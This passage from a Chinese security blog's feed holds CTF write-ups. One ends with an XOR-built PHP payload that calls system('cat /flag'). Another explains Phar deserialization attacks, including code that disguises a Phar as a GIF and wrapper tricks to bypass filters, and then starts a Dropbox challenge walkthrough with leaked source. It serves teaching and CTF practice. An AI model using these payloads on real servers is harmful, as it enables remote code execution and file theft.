punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">.</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"^$i$j"</span><span class="token punctuation">.</span><span class="token string">"==>$exp"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在打印出的结果中搜寻想要的字符串，找到最短的再组合</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token punctuation">(</span>is_nan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>tan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token operator">=</span>$<span class="token variable">$pi</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>以上就和第一种方法类似，然后在传命令执行的代码就可以了</li></ul><p>参考：</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>题目还是挺有意思的，如果再发现新方法再补上</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  先看到题目给出的源码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化浅析</title>
    <link href="https://www.extrader.top/2020/05/04/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/"/>
    <id>https://www.extrader.top/2020/05/04/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/</id>
    <published>2020-05-04T03:49:35.000Z</published>
    <updated>2020-07-14T10:43:04.475Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2" target="_blank" rel="noopener">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">PHAR反序列化拓展操作总结</a></li><li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><strong>②</strong>  <strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt="" loading="lazy"></p><p><strong>③</strong>  <strong>the file contents</strong></p><p>被压缩文件的内容。</p><p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，格式如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt="" loading="lazy"></p><p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p><h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt="" loading="lazy"></p><p>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用<code>phar://</code>协议读取文件的时候，文件会被解析成phar (<a href="https://www.php.net/manual/zh/intro.phar.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/intro.phar.php</a>) 的过程会触发<code>php_var_unserialize</code>函数对<strong>meta-data</strong>的操作，造成反序列化。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php" target="_blank" rel="noopener">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt="" loading="lazy"></p><ul><li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li><li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li><li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li><li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li><li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extractTo</span><span class="token punctuation">(</span>'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.phar/test');</span></code></pre><p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$z</span> <span class="token operator">=</span> 'compress<span class="token punctuation">.</span>bzip2<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar:///home/sx/test.phar/test.txt';</span></code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin" target="_blank" rel="noopener">PostgreSQL</a></strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"postgres"</span><span class="token punctuation">,</span> <span class="token string">"sx"</span><span class="token punctuation">,</span> <span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token punctuation">,</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.phar/aa');</span></code></pre><p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt="" loading="lazy"></p><p>明显的序列化存储</p><p>构造利用代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.phar/a_random_string';</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>成功打印结果，当然这里换其他的文件操作函数也可以</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt="" loading="lazy"></p><p><strong>将phar伪造成其他格式的文件</strong></p><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt="" loading="lazy"></p><p>和上面的一样可以利用成功</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt="" loading="lazy"></p><p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt="" loading="lazy"></p><p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt="" loading="lazy"></p><p>有以下文件：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt="" loading="lazy"></p><p>login.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token constant">HTML</span><span class="token punctuation">)</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('注册成功', 'info');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 20 &amp;&amp; $u-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('账号或密码错误', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>register.php</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token constant">HTML</span><span class="token punctuation">)</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 20 &amp;&amp; strlen($username) ></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;script>window.location.href='login.php?register';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('此用户名已被使用', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('请输入有效用户名和密码', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>upload.php</p><pre class=" 